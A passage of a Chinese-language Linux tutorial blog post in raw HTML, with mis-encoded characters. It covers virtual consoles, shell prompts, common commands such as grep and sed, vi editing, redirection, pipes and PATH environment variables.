class="token function">sudo</span> systemctl restart <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="Shellå‘½ä»¤è¡Œ"><a href="#Shellå‘½ä»¤è¡Œ" class="headerlink" title="Shellå‘½ä»¤è¡Œ"></a>Shellå‘½ä»¤è¡Œ</h1><h2 id="è™šæ‹Ÿæ§åˆ¶å°"><a href="#è™šæ‹Ÿæ§åˆ¶å°" class="headerlink" title="è™šæ‹Ÿæ§åˆ¶å°"></a>è™šæ‹Ÿæ§åˆ¶å°</h2><p>é™¤äº†æ¡Œé¢å¯åŠ¨ç»ˆç«¯çª—å£ï¼Œsshè¿æ¥ç»ˆç«¯ä»¥å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ linux çš„è™šæ‹Ÿæ§åˆ¶å°ï¼Œåœ¨ RHEL 6 ä¸Šå¯¹åº”çš„è®¾å¤‡æ˜¯ &#x2F;dev&#x2F;tty2ã€&#x2F;dev&#x2F;tty3ã€&#x2F;dev&#x2F;tty4ã€&#x2F;dev&#x2F;tty5ã€&#x2F;dev&#x2F;tty6</p><p>æ­¤ç§è¿è¡Œç­‰çº§ä¸º run level 3ï¼Œçº¯æ–‡æœ¬ç»ˆç«¯ ï¼ˆå›¾å½¢ç™»å½•ç¯å¢ƒ tty1 çš„è¿è¡Œç­‰çº§ä¸º run level 5ï¼‰</p><p>ä½¿ç”¨ ctrl+alt+f2&#x2F;f3&#x2F;f4&#x2F;f5&#x2F;f6 å¯ä»¥åˆ‡æ¢</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps9.jpg" alt="img"></p><p>alt + f3 å¯ä»¥åˆ‡æ¢ä¸ºæ§åˆ¶å° tty3</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps10.jpg" alt="img"></p><p>è¿™é‡Œç™»å½•æ—¶é—´åé¢æ˜¾ç¤ºçš„æ˜¯ä¸»æœºåœ°å€ï¼Œå¦‚æœæ˜¯è¿œç¨‹ä¸»æœºåˆ™ä¼šæ˜¾ç¤ºå…¶ ip</p><p>é»˜è®¤ç™»å½•è¿è¡Œçº§åˆ«çš„è®¾ç½®å¯ä»¥ä¿®æ”¹ &#x2F;etc&#x2F;inittab æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">id:3:initdefault:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Shell-å‘½ä»¤æç¤ºç¬¦"><a href="#Shell-å‘½ä»¤æç¤ºç¬¦" class="headerlink" title="Shell å‘½ä»¤æç¤ºç¬¦"></a>Shell å‘½ä»¤æç¤ºç¬¦</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhelserver /etc<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>[]</code>å†…çš„å†…å®¹å³ä¸º Shell æç¤ºç¬¦ï¼šæ ¼å¼<code>ç”¨æˆ·å@ä¸»æœºå å½“å‰ç›®å½•</code></p><p><code>~</code>ç¬¦å·æ˜¯è¡¨ç¤º<strong>ç”¨æˆ·ä¸»ç›®å½•çš„ Shell å˜é‡</strong></p><p>Shell å‘½ä»¤æç¤ºç¬¦çš„æ˜¾ç¤ºå†…å®¹å¯ä»¥é€šè¿‡ä¿®æ”¹ Shell çš„ç¯å¢ƒå˜é‡ PS1 æ¥å®ç°</p><hr><h2 id="ä¸€äº›å‘½ä»¤"><a href="#ä¸€äº›å‘½ä»¤" class="headerlink" title="ä¸€äº›å‘½ä»¤"></a>ä¸€äº›å‘½ä»¤</h2><p>è®°ä¸€äº›ä¹‹å‰æ²¡æ€ä¹ˆç”¨è¿‡çš„</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">reboot</span><span class="token comment"># é‡å¯</span><span class="token function">halt</span><span class="token function">shutdown</span><span class="token comment"># å…³æœº</span><span class="token builtin class-name">cd</span><span class="token comment"># ç›´æ¥åˆ‡æ¢åˆ°ç”¨æˆ·ä¸»ç›®å½•</span><span class="token builtin class-name">cd</span> -<span class="token comment"># å›åˆ°å‰ä¸€æ¬¡å·¥ä½œç›®å½•</span><span class="token function">mkdir</span> <span class="token punctuation">[</span>-p/--parents<span class="token punctuation">]</span> <span class="token punctuation">[</span>ç›®å½•<span class="token punctuation">]</span><span class="token comment"># -p å»ºç«‹å°šä¸å­˜åœ¨çš„ç›®å½•ï¼Œå³å¤šå±‚ç›®å½•</span><span class="token function">rmdir</span> <span class="token punctuation">[</span>-p<span class="token punctuation">]</span> <span class="token punctuation">[</span>ç›®å½•<span class="token punctuation">]</span><span class="token function">dmesg</span><span class="token comment"># æŸ¥çœ‹å†…æ ¸æ—¥å¿—</span><span class="token function">ls</span> <span class="token parameter variable">-d</span><span class="token comment"># æ˜¾ç¤ºæŒ‡å®šç›®å½•çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¸æ˜¾ç¤ºå­ç›®å½•åŠæ–‡ä»¶</span><span class="token function">ls</span> <span class="token parameter variable">-R</span><span class="token comment"># é€’å½’åˆ—å‡ºæ‰€æœ‰å­ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œç›®å½•</span><span class="token function">ls</span> <span class="token parameter variable">-i</span><span class="token comment"># æŸ¥è¯¢inodeå·</span><span class="token function">tail</span> <span class="token punctuation">[</span>-n<span class="token punctuation">]</span> æ–‡ä»¶å<span class="token function">head</span> <span class="token punctuation">[</span>-n<span class="token punctuation">]</span> æ–‡ä»¶å<span class="token comment"># æŸ¥çœ‹æŸæ–‡ä»¶çš„æœ«å°¾/å¤´å‡ è¡Œï¼Œ-næŒ‡å®šè¡Œæ•°ï¼Œé»˜è®¤10è¡Œ</span><span class="token function">cut</span> -d<span class="token punctuation">\</span>  <span class="token parameter variable">-f1</span> data.txt<span class="token comment"># -dæŒ‡å®šä»¥ç©ºæ ¼ä¸ºåˆ†éš”ç¬¦ï¼Œ-fæŒ‡å®šæ˜¾ç¤ºæ¯è¡Œåˆ†éš”å‡ºçš„ç¬¬ä¸€ä¸ªå­—æ®µ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216153437229.png" alt="image-20241216153437229"></p><p>ä½¿ç”¨lså‘½ä»¤æŸ¥çœ‹&#x2F;root&#x2F;lab4&#x2F;fileç›®å½•ä¸‹çš„å„ä¸ªæ–‡ä»¶çš„inodeç¼–å·ï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/9.jpg" alt="img"></p><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token punctuation">[</span>-clnvi<span class="token punctuation">]</span> <span class="token operator">&lt;</span>pattern<span class="token operator">></span> <span class="token operator">&lt;</span>files<span class="token operator">></span><span class="token parameter variable">-c</span> <span class="token comment"># åªæ˜¾ç¤ºç¬¦åˆå­—ç¬¦ä¸²æ¨¡å¼çš„æ€»è¡Œæ•°</span><span class="token parameter variable">-l</span> <span class="token comment"># åªæ˜¾ç¤ºç¬¦åˆå­—ç¬¦ä¸²æ¨¡å¼çš„æ–‡ä»¶çš„æ–‡ä»¶å</span><span class="token parameter variable">-n</span> <span class="token comment"># æ˜¾ç¤ºåŒ¹é…è¡Œçš„è¡Œå·</span><span class="token parameter variable">-v</span> <span class="token comment"># åé€‰</span><span class="token parameter variable">-i</span> <span class="token comment"># å¿½ç•¥å¤§å°å†™</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h3><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token punctuation">[</span>-hnV<span class="token punctuation">]</span><span class="token punctuation">[</span>-e<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-f<span class="token operator">&lt;</span>scriptæ–‡ä»¶<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>æ–‡æœ¬æ–‡ä»¶<span class="token punctuation">]</span>-e<span class="token operator">&lt;</span>script<span class="token operator">></span>/--expression<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span> <span class="token comment"># ä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ã€‚</span>-f<span class="token operator">&lt;</span>scriptæ–‡ä»¶<span class="token operator">></span>/--file<span class="token operator">=</span><span class="token operator">&lt;</span>scriptæ–‡ä»¶<span class="token operator">></span> <span class="token comment"># ä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ–‡ä»¶æ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ã€‚</span>-n/--quiet/--silent <span class="token comment"># ä»…æ˜¾ç¤ºscriptå¤„ç†åçš„ç»“æœ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Shell-åŠŸèƒ½"><a href="#Shell-åŠŸèƒ½" class="headerlink" title="Shell åŠŸèƒ½"></a>Shell åŠŸèƒ½</h2><p>ä»¥ Bash Shell ä¸ºå‡†</p><ol><li><p>å†å²å‘½ä»¤è®°å¿†åŠŸèƒ½</p><p>å‰ä¸€æ¬¡ç™»å½•ä»¥å‰æ‰€æ‰§è¡Œè¿‡çš„ Shell å‘½ä»¤è¢«ä¿å­˜åœ¨ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„ .bash_history æ–‡ä»¶ä¸­</p></li><li><p>Tabé”®è¡¥å…¨</p></li><li><p>æ–‡ä»¶åé€šé…</p><table><thead><tr><th>ç¬¦å·</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>*</td><td>åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td></tr><tr><td>?</td><td>åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td>[list]</td><td>åŒ¹é… list ä¸­çš„ä»»æ„å•ä¸€å­—ç¬¦</td></tr><tr><td>[c1-c2]</td><td>åŒ¹é… c1-c2 ä¸­çš„ä»»æ„å•ä¸€å­—ç¬¦</td></tr><tr><td>[!list]</td><td>åŒ¹é…é™¤ list ä¸­çš„ä»»æ„å•ä¸€å­—ç¬¦</td></tr><tr><td>{string1,string2,â€¦}</td><td>åŒ¹é… string1 æˆ– string2 ï¼ˆæˆ–æ›´å¤šï¼‰å…¶ä¸€å­—ç¬¦ä¸²</td></tr></tbody></table></li><li><p>å‘½ä»¤åˆ«å alias</p></li></ol><hr><h2 id="vi-å‘½ä»¤è¡Œç¼–è¾‘æ–‡ä»¶"><a href="#vi-å‘½ä»¤è¡Œç¼–è¾‘æ–‡ä»¶" class="headerlink" title="vi å‘½ä»¤è¡Œç¼–è¾‘æ–‡ä»¶"></a>vi å‘½ä»¤è¡Œç¼–è¾‘æ–‡ä»¶</h2><h3 id="æ¨¡å¼"><a href="#æ¨¡å¼" class="headerlink" title="æ¨¡å¼"></a>æ¨¡å¼</h3><p>å‘½ä»¤æ¨¡å¼ â€“&gt; æ–‡æœ¬ç¼–è¾‘æ¨¡å¼ï¼šiã€Iã€aã€Aã€oã€O</p><p>æ‰©å±•å‘½ä»¤æ¨¡å¼ï¼šEsc å›åˆ°å‘½ä»¤æ¨¡å¼ï¼Œè¾“å…¥<code>:</code>åˆ‡æ¢åˆ°æ‰©å±•å‘½ä»¤æ¨¡å¼</p><p>é€€å‡ºviï¼š</p><ul><li><code>wq</code>ä¿å­˜æ–‡ä»¶ï¼Œ<code>wq newfile</code>æˆ–<code>w newfile</code>å¦å­˜ä¸ºæ–°æ–‡ä»¶å</li><li><code>q!</code>ä¸ä¿å­˜é€€å‡º</li><li>åœ¨å‘½ä»¤æ¨¡å¼ä¸‹è¾“å…¥<code>ZZ</code>ï¼Œä¼šä¿å­˜å½“å‰æ–‡ä»¶çš„ä¿®æ”¹ï¼Œå¹¶é€€å‡º vi ç¼–è¾‘å™¨</li></ul><h3 id="vi-å‘½ä»¤"><a href="#vi-å‘½ä»¤" class="headerlink" title="vi å‘½ä»¤"></a>vi å‘½ä»¤</h3><p>å‘½ä»¤æ¨¡å¼ä¸‹</p><ol><li><p>å‘½ä»¤æ¨¡å¼ â€“&gt; æ–‡æœ¬ç¼–è¾‘æ¨¡å¼</p><p>iï¼šä»å½“å‰å…‰æ ‡ä½ç½®å¼€å§‹è¾“å…¥å­—ç¬¦</p><p>Iï¼šå…‰æ ‡ç§»åŠ¨åˆ°å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œçš„è¡Œé¦–ï¼Œå¼€å§‹è¾“å…¥å­—ç¬¦</p><p>aï¼šä»å½“å‰å…‰æ ‡åå¼€å§‹è¾“å…¥å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯åœ¨å½“å‰å…‰æ ‡æ‰€åœ¨çš„å­—ç¬¦åå¼€å§‹æ’å…¥æ–°å­—ç¬¦</p><p>Aï¼šå…‰æ ‡ç§»åŠ¨åˆ°å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œçš„è¡Œå°¾ï¼Œå¼€å§‹è¾“å…¥å­—ç¬¦</p><p>oï¼šåœ¨å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œä¹‹ä¸‹æ–°å¢ä¸€è¡Œ</p><p>Oï¼šåœ¨å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œä¹‹ä¸Šæ–°å¢ä¸€è¡Œ</p></li><li><p>å…‰æ ‡ç§»åŠ¨å‘½ä»¤</p><p>hï¼šå·¦ç§»ï¼Œå¦‚æœåœ¨ h å‰è¾“å…¥æ•°å­— nï¼Œåˆ™å…‰æ ‡å·¦ç§» n ä¸ªå­—ç¬¦ï¼Œä¸‹åŒ</p><p>lï¼šå³ç§»</p><p>jï¼šä¸Šç§»</p><p>kï¼šä¸‹ç§»</p><p>0ï¼šç§»åˆ°è¡Œé¦–</p><p>$ï¼šç§»åˆ°è¡Œå°¾</p><p>Gï¼šç§»åŠ¨åˆ°æ–‡ä»¶çš„æœ€åä¸€è¡Œçš„è¡Œé¦–</p><p>nGï¼šç§»åˆ°ç¬¬nè¡Œçš„è¡Œé¦–</p><p>Hï¼šç§»åˆ°å±å¹•ä¸Šæ˜¾ç¤ºçš„ç¬¬ä¸€è¡Œ</p><p>Lï¼šç§»åˆ°å±å¹•ä¸Šæ˜¾ç¤ºçš„æœ€åä¸€è¡Œ</p><p>Mï¼šç§»åˆ°å±å¹•çš„ä¸­é—´ä¸€è¡Œ</p><p>wæˆ–Wï¼šå³ç§»è‡³ä¸‹ä¸€ä¸ªå•è¯çš„è¯é¦–</p><p>eæˆ–Eï¼šç§»åŠ¨åˆ°å•è¯å°¾ï¼Œè‹¥å·²å¤„äºå½“å‰çš„å•è¯å°¾åˆ™ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå•è¯å°¾</p><p>bæˆ–Bï¼šç§»åŠ¨åˆ°è¯é¦–ï¼Œè‹¥å·²å¤„äºå½“å‰çš„å•è¯é¦–åˆ™ç§»åŠ¨åˆ°ä¸Šä¸€ä¸ªå•è¯é¦–</p><br><p>æ­¤å¤–ï¼Œè¿˜æœ‰æ‰©å±•æ¨¡å¼å‘½ä»¤</p><p><code>:n</code> ï¼šå…‰æ ‡ç§»åˆ°æ–‡ä»¶çš„ç¬¬nè¡Œ</p><p><code>:$</code> ï¼šå…‰æ ‡ç§»åˆ°æ–‡ä»¶çš„æœ€åä¸€è¡Œ</p></li><li><p>æ›¿æ¢åˆ é™¤å‘½ä»¤</p><p>rï¼šä½¿ç”¨éšåè¾“å…¥çš„å­—ç¬¦æ›¿æ¢å½“å‰å…‰æ ‡æ‰€åœ¨çš„å­—ç¬¦</p></li><li><p>å‰ªåˆ‡å‘½ä»¤</p><p>dï¼šå‰ªåˆ‡é€‰å®šå—åˆ°ç¼“å†²åŒº</p></li><li><p>å¤åˆ¶å‘½ä»¤</p><p>yï¼šå¤åˆ¶é€‰å®šå—åˆ°ç¼“å†²åŒº</p></li><li><p>ç²˜è´´å‘½ä»¤</p><p>pï¼šç²˜è´´åˆ°å½“å‰å…‰æ ‡å</p><p>Pï¼šç²˜è´´åˆ°å½“å‰å…‰æ ‡å‰</p></li><li><p>v å‘½ä»¤è¿›å…¥å¯è§†æ¨¡å¼ï¼Œç”¨äºé€‰å®šåŒºåŸŸ</p></li><li><p>u å‘½ä»¤æ’¤é”€å‰ä¸€æ¬¡ä¿®æ”¹</p></li><li><p>æŸ¥æ‰¾å‘½ä»¤</p><p>&#x2F;patternï¼šä»å…‰æ ‡å¼€å§‹å¤„å‘åæœç´¢ pattern å­—ç¬¦ä¸²</p><p>?patternï¼šä»å…‰æ ‡å¼€å§‹å¤„å‘å‰æœç´¢ pattern å­—ç¬¦ä¸²</p><p>nï¼šåœ¨åŒæ–¹å‘é‡å¤ä¸Šä¸€æ¬¡æœç´¢å‘½ä»¤</p><p>Nï¼šåœ¨åæ–¹å‘é‡å¤ä¸Šä¸€æ¬¡æœç´¢å‘½ä»¤</p></li><li><p>æ‰©å±•å‘½ä»¤æ¨¡å¼ä¸­â€”â€”æ›¿æ¢å‘½ä»¤s</p><p><code>:s/p1/p2</code>ï¼šå°†å½“å‰è¡Œç¬¬ä¸€æ¬¡å‡ºç°çš„ p1 ç”¨ p2 æ›¿ä»£</p><p><code>:s/p1/p2/g</code>ï¼šå°†å½“å‰è¡Œä¸­æ‰€æœ‰ p1 å‡ç”¨ p2 æ›¿ä»£</p></li></ol><hr><h2 id="æ‰©å±•-Shell-å‘½ä»¤"><a href="#æ‰©å±•-Shell-å‘½ä»¤" class="headerlink" title="æ‰©å±• Shell å‘½ä»¤"></a>æ‰©å±• Shell å‘½ä»¤</h2><h3 id="Shell-å‘½ä»¤æ›¿æ¢"><a href="#Shell-å‘½ä»¤æ›¿æ¢" class="headerlink" title="Shell å‘½ä»¤æ›¿æ¢"></a>Shell å‘½ä»¤æ›¿æ¢</h3><p>åœ¨Bash Shellä¸­ï¼Œåå¼•å· &#96; ä½œä¸ºå‘½ä»¤æ›¿æ¢åŠŸèƒ½ä½¿ç”¨ï¼Œå…·æœ‰å†…è”æ‰§è¡Œçš„åŠŸèƒ½</p><p>äºæ˜¯å°±æœ‰äº†è¿™æ ·çš„ç”¨æ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /lib/modules/<span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> <span class="token parameter variable">-r</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Shell-è¾“å…¥-x2F-è¾“å‡ºçš„é‡å®šå‘ä¸ç®¡é“"><a href="#Shell-è¾“å…¥-x2F-è¾“å‡ºçš„é‡å®šå‘ä¸ç®¡é“" class="headerlink" title="Shell è¾“å…¥&#x2F;è¾“å‡ºçš„é‡å®šå‘ä¸ç®¡é“"></a>Shell è¾“å…¥&#x2F;è¾“å‡ºçš„é‡å®šå‘ä¸ç®¡é“</h3><h4 id="æ ‡å‡†è¾“å…¥-x2F-è¾“å‡º"><a href="#æ ‡å‡†è¾“å…¥-x2F-è¾“å‡º" class="headerlink" title="æ ‡å‡†è¾“å…¥&#x2F;è¾“å‡º"></a>æ ‡å‡†è¾“å…¥&#x2F;è¾“å‡º</h4><p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œæ¯æ¡ shell å‘½ä»¤å¯¹åº”çš„è¿›ç¨‹éƒ½æœ‰ä¸‰ä¸ªä¸ä¹‹ç›¸å…³çš„è¾“å…¥&#x2F;è¾“å‡ºæµï¼Œå¯¹åº”ç‰¹æ®Šçš„æ–‡ä»¶æè¿°æŒ‡é’ˆï¼š</p><ul><li>æ ‡å‡†è¾“å…¥ï¼Œæ–‡ä»¶æè¿°æŒ‡é’ˆä¸º0ï¼šæ‰§è¡Œè¯¥è¿›ç¨‹æ—¶ï¼Œè¿›ç¨‹è·å¾—ç”¨æˆ·ä»é”®ç›˜è¾“å…¥çš„æ•°æ®</li><li>æ ‡å‡†è¾“å‡ºï¼Œæ–‡ä»¶æè¿°æŒ‡é’ˆä¸º1ï¼šå‘½ä»¤æ‰§è¡Œåä¼ å›çš„æ­£ç¡®ä¿¡æ¯</li><li>æ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œæ–‡ä»¶æè¿°æŒ‡é’ˆä¸º2ï¼šå‘½ä»¤æ‰§è¡Œå¤±è´¥åä¼ å›çš„é”™è¯¯ä¿¡æ¯</li></ul><p>ä»¥ cat å‘½ä»¤ä¸ºä¾‹ï¼Œå¦‚æœ cat çš„å‘½ä»¤è¡Œä¸­æ²¡æœ‰å‚æ•°ï¼Œå®ƒå°±ä¼šä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶é€åˆ°æ ‡å‡†è¾“å‡ºï¼Œç”¨æˆ·è¾“å…¥çš„æ¯ä¸€è¡Œéƒ½ç«‹åˆ»è¢« cat å‘½ä»¤è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œç›´åˆ° ctrl+d ç»“æŸè¾“å…¥ï¼Œcat å‘½ä»¤è¿è¡Œç»“æŸ</p><h4 id="è¾“å…¥-x2F-è¾“å‡ºé‡å®šå‘"><a href="#è¾“å…¥-x2F-è¾“å‡ºé‡å®šå‘" class="headerlink" title="è¾“å…¥&#x2F;è¾“å‡ºé‡å®šå‘"></a>è¾“å…¥&#x2F;è¾“å‡ºé‡å®šå‘</h4><ul><li><p>è¾“å…¥é‡å®šå‘ï¼šæŠŠå‘½ä»¤ï¼ˆæˆ–å¯æ‰§è¡Œç¨‹åºï¼‰çš„æ ‡å‡†è¾“å…¥é‡å®šå‘ä¸ºä»æŒ‡å®šçš„æ–‡ä»¶è·å–è¾“å…¥æ•°æ®</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">å‘½ä»¤<span class="token operator">&lt;</span>æ–‡ä»¶å<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¸¸ç”¨äºä¸æ¥å—æ–‡ä»¶åä½œä¸ºè¾“å…¥å‚æ•°çš„å‘½ä»¤ï¼Œè¦è¾“å…¥çš„å†…å®¹åˆå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶æ—¶</p><br></li><li><p>è¾“å‡ºé‡å®šå‘ï¼šæŠŠå‘½ä»¤ï¼ˆæˆ–å¯æ‰§è¡Œç¨‹åºï¼‰çš„æ ‡å‡†è¾“å‡ºæˆ–æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šæ–‡ä»¶ä¸­</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">å‘½ä»¤<span class="token operator">></span>æ–‡ä»¶å<span class="token operator"><span class="token file-descriptor important">1</span>></span> <span class="token comment">#stdout</span><span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token comment">#stderr</span>å‘½ä»¤<span class="token operator">>></span>æ–‡ä»¶å <span class="token comment">#è¿½åŠ åˆ°æ–‡ä»¶å°¾</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br></li><li><p>Here Documents è¾“å…¥é‡å®šå‘ï¼šå°†ä¸€å¯¹åˆ†éš”ç¬¦ä¹‹é—´çš„æ­£æ–‡é‡å®šå‘è¾“å…¥ç»™å‘½ä»¤</p><p>åœ¨<code>&lt;&lt;</code>æ“ä½œç¬¦åé¢ï¼Œä»»ä½•å­—ç¬¦éƒ½å¯ä»¥ä½œä¸ºæ­£æ–‡å¼€å§‹å‰çš„åˆ†éš”ç¬¦ï¼ŒHere æ–‡æ¡£çš„æ­£æ–‡ä¸€ç›´å»¶ç»­åˆ°å¦ä¸€ä¸ªåˆ†éš”ç¬¦ä¸ºæ­¢ï¼Œç¬¬äºŒä¸ªåˆ†éš”ç¬¦åº”å‡ºç°åœ¨æ–°è¡Œçš„å¼€å¤´ï¼Œå³åˆ†éš”ç¬¦å‰é¢ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œåˆ†éš”ç¬¦åé¢å¿…é¡»æ˜¯å›è½¦ç¬¦</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">command<span class="token operator">&lt;&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> limit_stringmsg_bodylimit_string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä½¿ç”¨<code>&lt;&lt;-</code>ï¼Œåˆ™ msg_body å’Œ limit_string è¡Œä¸­çš„æ‰€æœ‰å‰ç¼€ Tab å­—ç¬¦éƒ½å°†è¢«å¿½ç•¥ï¼ˆä½†ç©ºæ ¼ä¸ä¼šè¢«å¿½ç•¥ï¼‰</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216210643592.png" alt="image-20241216210643592"></p></li></ul><h4 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h4><p>å°†ä¸€ä¸ª shell å‘½ä»¤çš„è¾“å‡ºç»“æœä¼ é€’ç»™å¦ä¸€ä¸ª shell å‘½ä»¤ä½œä¸ºè¾“å…¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ linux shell æä¾›çš„ç®¡é“åŠŸèƒ½</p><p>ä½¿ç”¨ç®¡é“ç¬¦<code>|</code>æ¥å»ºç«‹ä¸€ä¸ªå¤šæ¡ shell å‘½ä»¤è”åˆæ‰§è¡Œçš„å‘½ä»¤</p><p>ç®¡é“å¯ä»¥æŠŠä¸€ç³»åˆ—å‘½ä»¤è¿æ¥èµ·æ¥ï¼Œç¬¬ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ä¼šä½œä¸ºç¬¬äºŒä¸ªå‘½ä»¤çš„è¾“å…¥é€šè¿‡ç®¡é“ä¼ ç»™ç¬¬äºŒä¸ªå‘½ä»¤</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216211314040.png" alt="image-20241216211314040"></p><hr><h2 id="Shell-å˜é‡"><a href="#Shell-å˜é‡" class="headerlink" title="Shell å˜é‡"></a>Shell å˜é‡</h2><h3 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h3><ol><li><p>å¼€å¯ä¸€ä¸ªç»ˆç«¯ç¨‹åºï¼Œæ‰§è¡Œå‘½ä»¤<code>echo $PATH</code>ï¼ŒæŸ¥çœ‹Linuxç¯å¢ƒå˜é‡PATHçš„å€¼ã€‚</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps45.jpg" alt="img"></p></li><li><p>æ–°å»ºç›®å½•â€œ&#x2F;opt&#x2F;arm-linux&#x2F;binâ€ï¼Œåœ¨Shellç»ˆç«¯ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><p><code>export PATH=$PATH:/opt/arm-linux/bin</code></p><p>æ‰§è¡Œå®Œæ¯•åæ£€æŸ¥PATHå˜é‡çš„å€¼ï¼Œæ˜¯å¦æœ‰åŠ å…¥è·¯å¾„â€œ&#x2F;opt&#x2F;arm-linux&#x2F;binâ€ï¼Œæ‰§è¡Œexité€€å‡ºå½“å‰Shellï¼Œç„¶åå†æ¬¡å¯åŠ¨ä¸€ä¸ªç»ˆç«¯ï¼ŒæŸ¥çœ‹PATHè·¯å¾„åˆ—è¡¨ï¼Œæ˜¯å¦æœ‰â€œ&#x2F;opt&#x2F;arm-linux&#x2F;binâ€</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps46.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps47.jpg" alt="img"></p></li><li><p>ç”¨å…¨å±å¹•ç¼–è¾‘å·¥å…·viç¼–å†™ä¸€ä¸ªæ–‡ä»¶setenv.shï¼Œåœ¨setenv.shå†™å…¥èƒ½å¤Ÿä¸ºç¯å¢ƒå˜é‡PATHæ–°å¢è·¯å¾„â€œ&#x2F;opt&#x2F;arm-linux&#x2F;binâ€çš„å‘½ä»¤ï¼š<br><code>export PATH=$PATH:/opt/arm-linux/bin</code></p><p>ä¿å­˜é€€å‡ºviï¼Œç„¶åæ‰§è¡Œâ€œsource setenv.shâ€å‘½ä»¤ï¼Œæ‰§è¡Œå®Œæˆåå†æ¬¡æŸ¥çœ‹PATH 